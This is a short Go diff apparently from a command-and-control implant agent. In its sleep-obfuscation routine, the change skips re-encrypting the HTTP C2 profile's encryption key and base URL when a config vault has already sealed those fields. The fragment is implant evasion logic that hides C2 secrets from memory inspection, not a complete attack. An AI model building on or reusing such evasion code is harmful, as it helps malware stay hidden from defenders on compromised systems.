@@ -149,8 +149,9 @@ func obfuscateSleep(agent *structs.Agent, c2 profiles.Profile) *sleepVault {
 	agent.DefaultPPID = 0
 
 	// --- Encrypt HTTP C2 profile ---
-	// Safe because we already confirmed no tasks running.
-	if hp, ok := c2.(*fhttp.HTTPProfile); ok {
+	// Skip if the config vault is active — fields are already encrypted at rest
+	// and only decrypted on-demand for individual HTTP operations.
+	if hp, ok := c2.(*fhttp.HTTPProfile); ok && !hp.IsSealed() {
 		pd := profileSensitiveData{
 			EncryptionKey: hp.EncryptionKey,
 			BaseURL:       hp.BaseURL,
